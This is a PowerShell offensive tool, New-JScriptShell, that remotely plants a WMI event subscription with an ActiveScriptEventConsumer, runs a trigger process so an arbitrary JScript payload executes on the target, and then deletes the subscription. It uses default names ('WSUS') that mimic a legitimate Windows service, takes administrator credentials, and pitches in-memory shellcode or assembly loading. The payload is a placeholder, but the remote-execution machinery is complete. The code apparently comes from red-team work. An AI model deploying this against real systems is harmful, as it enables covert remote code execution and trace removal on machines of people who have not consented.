function New-JScriptShell {
    <#
    .SYNOPSIS 
    Deploy a wmi event subscription remotely, using the ActiveScriptEventConsumer

    Author: Christopher Ross (@xorrior)
    License: BSD 3-Clause
    Required Dependencies: None
    Optional Dependencies: None

    .DESCRIPTION
    This script can be used to remotely (or locally) deploy a wmi event subscription with an ActiveScriptEventConsumer. This is not a new technique
    except for the fact that @tirannido recently released a really interesting method that would allow for dynamic loading of a csharp assembly entirely from memory within a jscript file.
    We can use this technique to remotely deploy csharp assemblies without writing to disk (i.e. SharpPick for powershell, a shellcode loader, .etc). The trigger to deploy
    this consumer is a Win32_ProcessStartTrace event for the process specified. Once the event has occurred, the JScript payload will be executed. All components of the Wmi subscription will
    be cleaned up.

    .PARAMETER ComputerName
    Host to target. Do not use for localhost.

    .PARAMETER User
    Username for a PSCredential object to be used with the Set-WmiInstance cmdlet.

    .PARAMETER Pass
    The password for a PSCredential object to be used with the Set-WmiInstance cmdlet.

    .PARAMETER ConsumerName
    The name of the ActiveScriptEventConsumer

    .PARAMETER FilterName
    The name of the EventFilter

    .PARAMETER JScriptPath
    Path to the jscript file to use as the payload. If not used, the inline JScript payload will be used.

    .PARAMETER ProcessName
    Name of the process to execute and trigger the payload

    .EXAMPLE

    Execute the JScript payload on a remote host with 'notepad.exe' as the trigger process

    New-JScriptShell -ComputerName '192.168.1.7' -ProcessName 'notepad.exe' 

    .EXAMPLE

    Execute the JScript payload from a file path on a remote host, with credentials, with 'calc.exe' as the trigger process.

    New-JScriptShell -ComputerName '192.168.1.7' -User 'Administrator' -Pass 'P@ssw0rd' -ProcessName 'calc.exe'

    #>
    [CmdletBinding(DefaultParameterSetName = 'None')]
    param
    (
        [Parameter(Mandatory = $false, ValueFromPipeline = $true)]
        [ValidateNotNullOrEmpty()]
        [string]$ComputerName,

        [Parameter(Mandatory = $false, ParameterSetName = "Credentials")]
        [ValidateNotNullOrEmpty()]
        [string]$User,

        [Parameter(Mandatory = $false, ParameterSetName = "Credentials")]
        [ValidateNotNullOrEmpty()]
        [string]$Pass,

        [Parameter(Mandatory = $false)]
        [ValidateNotNullOrEmpty()]
        [string]$ConsumerName = 'WSUS',

        [Parameter(Mandatory = $false)]
        [ValidateNotNullOrEmpty()]
        [string]$FilterName = 'WSUS',

        [Parameter(Mandatory = $false)]
        [ValidateNotNullOrEmpty()]
        [ValidateScript({Test-Path -Path $_})]
        [string]$JScriptPath,

        [Parameter(Mandatory = $true)]
        [ValidateNotNullOrEmpty()]
        [string]$ProcessName
    )

    $wmiArgs = @{}
    $commonArgs = @{}

    #Assign credentials and computer name if used
    if ($PSCmdlet.ParameterSetName -eq "Credentials" -and $PSBoundParameters['ComputerName']) {
        $securePassword = $Pass | ConvertTo-SecureString -AsPlainText -Force
        $commonArgs['Credential'] = New-Object System.Management.Automation.PSCredential $User,$securePassword
    }

    if($PSBoundParameters['ComputerName']) {
        $commonArgs['ComputerName'] = $ComputerName
    }

    if ($PSBoundParameters['JScriptPath']) {
        $Payload = [System.IO.File]::ReadAllText($JScriptPath)
    }

    #setup the event filter
    $Query = "SELECT * FROM Win32_ProcessStartTrace where processname ='$ProcessName'"
    $EventFilterArgs = @{
        EventNamespace = 'root/cimv2'
        Name = $FilterName
        Query = $Query
        QueryLanguage = 'WQL'
    }

    Write-Verbose "[*] Creating the wmi filter"
    $Filter = Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments $EventFilterArgs @commonArgs
    #setup the ActiveScriptEventConsumer
    $ActiveScriptEventConsumerArgs = @{
        Name = $ConsumerName
        ScriptingEngine = 'JScript'
        ScriptText = $Payload
    }
    Start-Sleep -Seconds 10
    Write-Verbose "[*] Creating the consumer"
    $Consumer =  Set-WmiInstance -Namespace root\subscription -Class ActiveScriptEventConsumer -Arguments $ActiveScriptEventConsumerArgs @commonArgs

    $FilterToConsumerArgs = @{
        Filter = $Filter
        Consumer = $Consumer
    }
    Start-Sleep -Seconds 10
    Write-Verbose "[*] Creating the wmi filter to consumer binding"
    $FilterToConsumerBinding = Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments $FilterToConsumerArgs @commonArgs

    Write-Verbose "[*] Executing process trigger"
    Start-Sleep -Seconds 10
    $result = Invoke-WmiMethod -Class Win32_process -Name Create -ArgumentList "$ProcessName" @commonArgs
    if ($result.returnValue -ne 0) {
        Write-Verbose "Trigger process was not started"
        break
    }

    Write-Verbose "[*] Cleaning up the subscription"
    Start-Sleep -Seconds 20
    $EventConsumerToCleanup = Get-WmiObject -Namespace root\subscription -Class ActiveScriptEventConsumer -Filter "Name = '$ConsumerName'" @commonArgs
    $EventFilterToCleanup = Get-WmiObject -Namespace root\subscription -Class __EventFilter -Filter "Name = '$FilterName'" @commonArgs
    $FilterConsumerBindingToCleanup = Get-WmiObject -Namespace root\subscription -Query "REFERENCES OF {$($EventConsumerToCleanup.__RELPATH)} WHERE ResultClass = __FilterToConsumerBinding" @commonArgs

    $EventConsumerToCleanup | Remove-WmiObject
    $EventFilterToCleanup | Remove-WmiObject
    $FilterConsumerBindingToCleanup | Remove-WmiObject

    $OutputObject = New-Object -TypeName PSObject 
    $OutputObject | Add-Member -MemberType 'NoteProperty' -Name 'Target' -Value $ComputerName
    $OutputObject | Add-Member -MemberType 'NoteProperty' -Name 'FilterName' -Value $FilterName
    $OutputObject | Add-Member -MemberType 'NoteProperty' -Name 'ConsumerName' -Value $ConsumerName
    $OutputObject | Add-Member -MemberType 'NoteProperty' -Name 'ProcessTrigger' -Value $ProcessName
    $OutputObject | Add-Member -MemberType 'NoteProperty' -Name 'Query' -Value $Query

    $OutputObject

}

$Payload = @'
Your JScript payload goes here if not read from a file.
'@
